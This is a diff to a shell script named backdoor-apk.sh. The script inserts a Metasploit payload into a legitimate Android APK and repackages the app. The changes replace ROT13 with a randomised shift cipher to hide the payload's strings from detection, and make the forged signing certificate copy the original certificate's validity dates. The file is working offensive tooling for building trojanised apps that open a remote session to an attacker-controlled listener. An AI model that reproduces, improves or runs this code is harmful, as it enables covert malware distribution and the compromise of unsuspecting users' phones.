@@ -2,8 +2,6 @@
 
 # file: backdoor-apk.sh
 
-# version: 0.1.8
-
 # usage: ./backdoor-apk.sh original.apk
 
 # Dana James Traversie
@@ -14,6 +12,8 @@
 #   in order to get things rolling. These packages are likely
 #   required by other Linux distros as well.
 # apt-get install lib32z1 lib32ncurses5 lib32stdc++6
+
+VERSION="0.1.9"
 
 PAYLOAD=""
 LHOST=""
@@ -151,7 +151,7 @@ function get_lport {
 function init {
   echo "Running backdoor-apk at $TIME_OF_RUN" >$LOG_FILE 2>&1
   print_ascii_art
-  echo "[*] Running backdoor-apk.sh v0.1.8 on $TIME_OF_RUN"
+  echo "[*] Running backdoor-apk.sh v$VERSION on $TIME_OF_RUN"
   consult_which $MSFVENOM
   consult_which $DEX2JAR
   consult_which $UNZIP
@@ -359,8 +359,8 @@ cat >$MY_PATH/obfuscate.method <<EOL
 
     move-result-object ###REG###
 EOL
-helper_class=`ls $MY_PATH/original/smali/$payload_tld/$payload_primary_dir/$payload_sub_dir/*.smali |grep -v "AppBoot" |grep -v "MainService" |sort -r |head -n 1 |sed "s:$MY_PATH/original/smali/::g" |sed "s:.smali::g"`
-echo "Helper class: $helper_class" >>$LOG_FILE 2>&1
+stringobfuscator_class=`ls $MY_PATH/original/smali/$payload_tld/$payload_primary_dir/$payload_sub_dir/*.smali |grep -v "AppBoot" |grep -v "MainService" |sort -r |head -n 1 |sed "s:$MY_PATH/original/smali/::g" |sed "s:.smali::g"`
+echo "StringObfuscator class: $stringobfuscator_class" >>$LOG_FILE 2>&1
 sed -i 's/[[:space:]]*"$/"/g' $MY_PATH/original/smali/$payload_tld/$payload_primary_dir/$payload_sub_dir/*.smali >>$LOG_FILE 2>&1
 rc=$?
 if [ $rc == 0 ]; then
@@ -372,7 +372,14 @@ if [ $rc == 0 ]; then
     tmp=`echo $line |awk -F ": " '{ print $2 }'`
     reg=`echo $tmp |awk '{ print $2 }' |sed 's/,//'`
     echo "Reg: $reg" >>$LOG_FILE 2>&1
-    replacement=`echo $target |tr '[A-Za-z]' '[N-ZA-Mn-za-m]'`
+    trlist_max_line=`wc -l $MY_PATH/lists/trlist.txt |awk '{ print $1 }'`
+    trlist_rand_line=`shuf -i 1-${trlist_max_line} -n 1`
+    trlist_line=`sed "${trlist_rand_line}q;d" $MY_PATH/lists/trlist.txt`
+    shift_count=$(awk '{ print $1 }' <<< $trlist_line)
+    shift_tr_value=$(awk '{ print $2 }' <<< $trlist_line)
+    echo "Shift count: $shift_count" >>$LOG_FILE 2>&1
+    echo "Shift tr value: $shift_tr_value" >>$LOG_FILE 2>&1
+    replacement=`echo $target |tr '[A-Za-z]' $shift_tr_value |sed 's:^":"'"$shift_count"':g'`
     echo "Replacement: $replacement" >>$LOG_FILE 2>&1
     sed -i 's%'"$target"'%'"$replacement"'%' $file >>$LOG_FILE 2>&1
     rc=$?
@@ -395,7 +402,7 @@ if [ $rc == 0 ]; then
   done
   if [ ! -f $MY_PATH/obfuscate.error ]; then
     #class="$payload_tld/$payload_primary_dir/$payload_sub_dir/e"
-    class="$helper_class"
+    class="$stringobfuscator_class"
     sed -i 's|###CLASS###|'"$class"'|' $MY_PATH/original/smali/$payload_tld/$payload_primary_dir/$payload_sub_dir/*.smali
     rc=$?
   else
@@ -499,18 +506,29 @@ valid_from_line=`$KEYTOOL -J-Duser.language=en -printcert -jarfile $ORIG_APK_FIL
 echo "Original valid from line: $valid_from_line" >>$LOG_FILE 2>&1
 from_date=$(sed 's/^Valid from://g' <<< $valid_from_line |sed 's/until:.\+$//g' |sed 's/^[[:space:]]*//g' |sed 's/[[:space:]]*$//g')
 echo "Original from date: $from_date" >>$LOG_FILE 2>&1
+from_date_tz=$(awk '{ print $5 }' <<< $from_date)
+from_date_norm=$(sed 's/[[:space:]]'"$from_date_tz"'//g' <<< $from_date)
+echo "Normalized from date: $from_date_norm" >>$LOG_FILE 2>&1
 to_date=$(sed 's/^Valid from:.\+until://g' <<< $valid_from_line |sed 's/^[[:space:]]*//g' |sed 's/[[:space:]]*$//g')
 echo "Original to date: $to_date" >>$LOG_FILE 2>&1
-from_date_str=`date --date="$from_date" +"%Y/%m/%d %T"`
+to_date_tz=$(awk '{ print $5 }' <<< $to_date)
+to_date_norm=$(sed 's/[[:space:]]'"$to_date_tz"'//g' <<< $to_date)
+echo "Normalized to date: $to_date_norm" >>$LOG_FILE 2>&1
+from_date_str=`TZ=UTC date --date="$from_date_norm" +"%Y/%m/%d %T"`
 echo "Value of from_date_str: $from_date_str" >>$LOG_FILE 2>&1
-end_ts=$(date -ud "$to_date" +'%s')
-start_ts=$(date -ud "$from_date" +'%s')
+end_ts=$(TZ=UTC date -ud "$to_date_norm" +'%s')
+start_ts=$(TZ=UTC date -ud "$from_date_norm" +'%s')
 validity=$(( ( (${end_ts} - ${start_ts}) / (60*60*24) ) ))
 echo "Value of validity: $validity" >>$LOG_FILE 2>&1
 
 echo -n "[*] Generating RSA key for signing..."
 $KEYTOOL -genkey -noprompt -alias signing.key -startdate "$from_date_str" -validity $validity -dname "$dname" -keystore $keystore -storepass android -keypass android -keyalg RSA -keysize 2048 >>$LOG_FILE 2>&1
 rc=$?
+if [ $rc != 0 ]; then
+  echo "Retrying RSA key generation without original APK cert from date and validity values" >>$LOG_FILE 2>&1
+  $KEYTOOL -genkey -noprompt -alias signing.key -validity 10000 -dname "$dname" -keystore $keystore -storepass android -keypass android -keyalg RSA -keysize 2048 >>$LOG_FILE 2>&1
+  rc=$?
+fi
 echo "done."
 if [ $rc != 0 ]; then
   echo "[!] Failed to generate RSA key"
